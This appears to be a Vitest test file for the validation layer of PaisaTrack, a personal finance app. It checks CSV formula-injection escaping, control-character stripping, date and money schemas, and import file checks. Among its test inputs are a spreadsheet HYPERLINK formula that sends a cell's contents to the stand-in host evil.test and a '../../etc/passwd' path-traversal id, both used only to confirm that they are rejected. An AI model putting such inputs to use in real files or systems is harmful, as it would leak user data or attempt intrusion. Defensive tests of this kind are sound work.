/**
 * Tests for the trust boundary.
 *
 * Everything here guards data arriving from outside the app: a CSV the user
 * picked, a backup file, or `data.json` pulled from GitHub. The app treats all
 * three as hostile — not because an attacker is assumed, but because a
 * half-written file, a spreadsheet that reformatted a column, and a sync from a
 * newer build are all ordinary events that must not corrupt the database.
 *
 * Control characters are written as escapes throughout. Putting the literal
 * bytes in the source would make this file binary to `grep` and invisible in a
 * diff — which is the same reasoning `stripControlChars` itself is written on.
 */
import { describe, expect, it } from 'vitest';
import {
  MAX_IMPORT_BYTES,
  MAX_IMPORT_ROWS,
  MAX_PAISE,
  ValidationError,
  checkImportFile,
  cleanText,
  csvSafe,
  idSchema,
  isRealCalendarDate,
  isoDateSchema,
  paiseSchema,
  parseAndValidatePayload,
  stripControlChars,
  validateCsvRows,
} from '@/lib/validation';
import { toPaise } from '@/lib/finance/money';

describe('stripControlChars', () => {
  it('removes NUL and DEL', () => {
    expect(stripControlChars('a\u0000bcd')).toBe('abcd');
    expect(stripControlChars('a\u007Fb')).toBe('ab');
  });

  it('removes an ANSI escape, which would otherwise survive into an export', () => {
    expect(stripControlChars('Coffee\u001B[31m red')).toBe('Coffee[31m red');
  });

  it('removes newlines and tabs, which break a CSV cell', () => {
    expect(stripControlChars('line\nbreak\ttab')).toBe('linebreaktab');
  });

  it('leaves ordinary text alone, including non-Latin scripts and symbols', () => {
    expect(stripControlChars('Chai ₹120')).toBe('Chai ₹120');
    expect(stripControlChars('किराया')).toBe('किराया');
    expect(stripControlChars('café — naïve')).toBe('café — naïve');
  });

  it('does not split characters outside the basic plane', () => {
    // Iterating by code unit rather than codepoint would cut this in half.
    expect(stripControlChars('spent 🎉')).toBe('spent 🎉');
  });

  it('handles an empty string', () => {
    expect(stripControlChars('')).toBe('');
  });
});

describe('cleanText', () => {
  it('strips, trims and caps', () => {
    expect(cleanText('   padded  ', 100)).toBe('padded');
    expect(cleanText('abcdefghij', 4)).toBe('abcd');
    expect(cleanText('a\u0000b', 10)).toBe('ab');
  });

  it('turns null and undefined into an empty string, not "null"', () => {
    expect(cleanText(null, 10)).toBe('');
    expect(cleanText(undefined, 10)).toBe('');
  });
});

describe('csvSafe', () => {
  it('neutralises every character a spreadsheet treats as a formula start', () => {
    expect(csvSafe('=1+1')).toBe("'=1+1");
    expect(csvSafe('+44 20 7946')).toBe("'+44 20 7946");
    expect(csvSafe('-500 refund')).toBe("'-500 refund");
    expect(csvSafe('@channel')).toBe("'@channel");
  });

  it('neutralises the real attack shape', () => {
    const attack = '=HYPERLINK("https://evil.test?d="&A1,"Total")';
    expect(csvSafe(attack).startsWith("'=")).toBe(true);
  });

  it('leaves ordinary descriptions untouched', () => {
    expect(csvSafe('Chai at the stall')).toBe('Chai at the stall');
    expect(csvSafe('Rent for April')).toBe('Rent for April');
    expect(csvSafe('')).toBe('');
  });

  it('only reacts to the FIRST character', () => {
    // An equals sign mid-string is not a formula and must not be mangled.
    expect(csvSafe('2+2 = 4')).toBe('2+2 = 4');
  });

  it('handles null and undefined', () => {
    expect(csvSafe(null)).toBe('');
    expect(csvSafe(undefined)).toBe('');
  });
});

describe('primitive schemas', () => {
  it('rejects a fractional paisa, because money is integer paise', () => {
    expect(paiseSchema.safeParse(100).success).toBe(true);
    expect(paiseSchema.safeParse(100.5).success).toBe(false);
  });

  it('allows a negative amount, because refunds exist', () => {
    expect(paiseSchema.safeParse(-5000).success).toBe(true);
  });

  it('rejects implausible magnitudes in both directions', () => {
    expect(paiseSchema.safeParse(MAX_PAISE).success).toBe(true);
    expect(paiseSchema.safeParse(MAX_PAISE + 1).success).toBe(false);
    expect(paiseSchema.safeParse(-MAX_PAISE - 1).success).toBe(false);
  });

  it('requires a real date, not merely a well-shaped one', () => {
    expect(isoDateSchema.safeParse('2026-02-15').success).toBe(true);
    expect(isoDateSchema.safeParse('15-02-2026').success).toBe(false);
    expect(isoDateSchema.safeParse('2026-2-5').success).toBe(false);
    expect(isoDateSchema.safeParse('2026-13-01').success).toBe(false);
  });

  it('rejects a day that does not exist in that month', () => {
    // `Date.parse` does NOT catch these — it rolls 2026-02-30 forward to
    // 2 March and 2026-04-31 to 1 May. Storing the original string and
    // rendering the rolled-over date is silent corruption, so the schema
    // checks the calendar rather than trusting the parser.
    expect(isRealCalendarDate('2026-02-30')).toBe(false);
    expect(isRealCalendarDate('2026-04-31')).toBe(false);
    expect(isRealCalendarDate('2025-02-29')).toBe(false); // 2025 is not a leap year
    expect(isoDateSchema.safeParse('2026-02-30').success).toBe(false);
    expect(isoDateSchema.safeParse('2026-04-31').success).toBe(false);
  });

  it('accepts the leap day in a leap year', () => {
    expect(isRealCalendarDate('2028-02-29')).toBe(true);
    expect(isoDateSchema.safeParse('2028-02-29').success).toBe(true);
  });

  it('accepts the boundaries of a month', () => {
    expect(isRealCalendarDate('2026-01-31')).toBe(true);
    expect(isRealCalendarDate('2026-12-31')).toBe(true);
    expect(isRealCalendarDate('2026-01-01')).toBe(true);
  });

  it('keeps anything odd out of an id, since ids are used as keys', () => {
    expect(idSchema.safeParse('exp_01HQ3K').success).toBe(true);
    expect(idSchema.safeParse('../../etc/passwd').success).toBe(false);
    expect(idSchema.safeParse('a b').success).toBe(false);
    expect(idSchema.safeParse('').success).toBe(false);
    expect(idSchema.safeParse('x'.repeat(129)).success).toBe(false);
  });
});

describe('validateCsvRows', () => {
  const row = (over: Record<string, string> = {}) => ({
    date: '2026-03-01',
    amount: '250',
    category: 'FOOD',
    description: 'Lunch',
    paymentMethod: 'UPI',
    ...over,
  });

  it('accepts a well-formed row and converts the amount to paise', () => {
    const { rows, problems } = validateCsvRows([row()], toPaise);
    expect(problems).toEqual([]);
    expect(rows).toHaveLength(1);
    expect(rows[0].amount).toBe(25_000);
    expect(rows[0].category).toBe('FOOD');
  });

  it('reports the offending line number, counting the header', () => {
    const { rows, problems } = validateCsvRows([row(), row({ amount: '' })], toPaise);
    expect(rows).toHaveLength(1);
    expect(problems).toEqual(['Row 3: no amount']);
  });

  it('keeps the good rows when some are bad, instead of refusing the file', () => {
    const { rows, problems } = validateCsvRows(
      [row(), row({ date: 'nonsense' }), row({ amount: '-5' }), row()],
      toPaise,
    );
    expect(rows).toHaveLength(2);
    expect(problems).toHaveLength(2);
  });

  it('falls back to OTHER and UPI rather than dropping a row over a typo', () => {
    const { rows, problems } = validateCsvRows(
      [row({ category: 'NOT_A_CATEGORY', paymentMethod: 'carrier pigeon' })],
      toPaise,
    );
    expect(problems).toEqual([]);
    expect(rows[0].category).toBe('OTHER');
    expect(rows[0].paymentMethod).toBe('UPI');
  });

  it('normalises case and spacing in the payment method', () => {
    const { rows } = validateCsvRows([row({ paymentMethod: 'credit card' })], toPaise);
    expect(rows[0].paymentMethod).toBe('CREDIT_CARD');
  });

  it('strips currency formatting from the amount', () => {
    const { rows } = validateCsvRows([row({ amount: '₹1,250.50' })], toPaise);
    expect(rows[0].amount).toBe(1_25_050);
  });

  it('rejects a row whose date does not exist in that month', () => {
    // The CSV path had its own copy of the lenient Date.parse check, so this
    // row used to import as 1 May.
    const { rows, problems } = validateCsvRows([row({ date: '2026-04-31' })], toPaise);
    expect(rows).toHaveLength(0);
    // Not "must be YYYY-MM-DD" — it already is, and saying so helps nobody.
    expect(problems).toEqual(['Row 2: 2026-04-31 is not a real date']);
  });

  it('still reports a malformed date shape as a shape problem', () => {
    const { problems } = validateCsvRows([row({ date: '31/04/2026' })], toPaise);
    expect(problems).toEqual(['Row 2: date must be YYYY-MM-DD']);
  });

  it('rejects a zero or negative amount', () => {
    expect(validateCsvRows([row({ amount: '0' })], toPaise).problems).toHaveLength(1);
    expect(validateCsvRows([row({ amount: '-100' })], toPaise).problems).toHaveLength(1);
  });

  it('sanitises description and notes rather than storing control characters', () => {
    const { rows } = validateCsvRows(
      [row({ description: 'Chai\u0000 stall', notes: 'a\u001Bb' })],
      toPaise,
    );
    expect(rows[0].description).toBe('Chai stall');
    expect(rows[0].notes).toBe('ab');
  });

  it('substitutes the category when the description is blank', () => {
    const { rows } = validateCsvRows([row({ description: '', category: 'FOOD' })], toPaise);
    expect(rows[0].description).toBe('food');
  });

  it('refuses a file with more rows than any real export could have', () => {
    const many = Array.from({ length: MAX_IMPORT_ROWS + 1 }, () => row());
    expect(() => validateCsvRows(many, toPaise)).toThrow(ValidationError);
  });

  it('handles an empty file without complaining', () => {
    expect(validateCsvRows([], toPaise)).toEqual({ rows: [], problems: [] });
  });
});

describe('parseAndValidatePayload', () => {
  const payload = (over: Record<string, unknown> = {}) =>
    JSON.stringify({
      schemaVersion: 1,
      exportedAt: '2026-03-01T00:00:00.000Z',
      deviceId: 'dev_a',
      data: { expenses: [] },
      ...over,
    });

  it('accepts a valid payload and fills in the tables it omits', () => {
    const r = parseAndValidatePayload(payload());
    expect(r.schemaVersion).toBe(1);
    expect(r.deviceId).toBe('dev_a');
    expect(r.data.loans).toEqual([]);
  });

  it('refuses non-JSON rather than treating it as an empty database', () => {
    // The failure mode this prevents is the worst one available: parsing to
    // nothing, then "merging" that over the user's real data.
    expect(() => parseAndValidatePayload('<html>404</html>')).toThrow(/not valid JSON/);
  });

  it('refuses JSON that is not a PaisaTrack export', () => {
    expect(() => parseAndValidatePayload('{"hello":1}')).toThrow(/does not look like/);
    expect(() => parseAndValidatePayload('[]')).toThrow(/does not look like/);
  });

  it('refuses a payload from a newer schema instead of guessing', () => {
    expect(() => parseAndValidatePayload(payload({ schemaVersion: 99 }))).toThrow(/newer version/);
  });

  it('refuses a file too large to be a backup', () => {
    const huge = `{"schemaVersion":1,"data":{},"pad":"${'x'.repeat(MAX_IMPORT_BYTES)}"}`;
    expect(() => parseAndValidatePayload(huge)).toThrow(/too large/);
  });

  it('drops individual malformed records but keeps the sound ones', () => {
    const good = {
      id: 'exp_1',
      createdAt: '2026-01-01T00:00:00.000Z',
      updatedAt: '2026-01-01T00:00:00.000Z',
      amount: 1000,
      date: '2026-01-01',
      category: 'FOOD',
      description: 'Lunch',
      paymentMethod: 'UPI',
    };
    const r = parseAndValidatePayload(
      payload({ data: { expenses: [good, { id: 'no-timestamps' }] } }),
    );
    expect(r.data.expenses).toHaveLength(1);
    expect(r.dropped).toBe(1);
    expect(r.problems.length).toBeGreaterThan(0);
  });

  it('carries details on the error so the user can see what was wrong', () => {
    try {
      parseAndValidatePayload('{"hello":1}');
      expect.unreachable('should have thrown');
    } catch (e) {
      expect(e).toBeInstanceOf(ValidationError);
      expect((e as ValidationError).details?.length).toBeGreaterThan(0);
    }
  });
});

describe('checkImportFile', () => {
  const file = (name: string, size: number, type = '') => ({ name, size, type }) as File;

  it('accepts a plausible CSV', () => {
    expect(checkImportFile(file('expenses.csv', 2048, 'text/csv'), 'csv').ok).toBe(true);
  });

  it('accepts a CSV whose MIME type the browser guessed oddly', () => {
    // Windows reports application/vnd.ms-excel for .csv often enough that
    // rejecting on type alone would break ordinary imports.
    expect(checkImportFile(file('e.csv', 100, 'application/vnd.ms-excel'), 'csv').ok).toBe(true);
    expect(checkImportFile(file('e.csv', 100, ''), 'csv').ok).toBe(true);
  });

  it('rejects an empty file', () => {
    expect(checkImportFile(file('e.csv', 0), 'csv')).toMatchObject({ ok: false });
  });

  it('rejects a file far larger than any real export', () => {
    const r = checkImportFile(file('e.csv', MAX_IMPORT_BYTES + 1), 'csv');
    expect(r.ok).toBe(false);
    expect(r.message).toMatch(/limit is 5 MB/);
  });

  it('rejects the wrong extension, including a renamed executable', () => {
    expect(checkImportFile(file('payload.exe', 100), 'csv').ok).toBe(false);
    expect(checkImportFile(file('backup.csv', 100), 'json').ok).toBe(false);
  });

  it('is case-insensitive about the extension', () => {
    expect(checkImportFile(file('EXPENSES.CSV', 100), 'csv').ok).toBe(true);
  });

  it('rejects a JSON import whose type actively contradicts the extension', () => {
    expect(checkImportFile(file('b.json', 100, 'image/png'), 'json').ok).toBe(false);
    expect(checkImportFile(file('b.json', 100, 'application/json'), 'json').ok).toBe(true);
  });
});
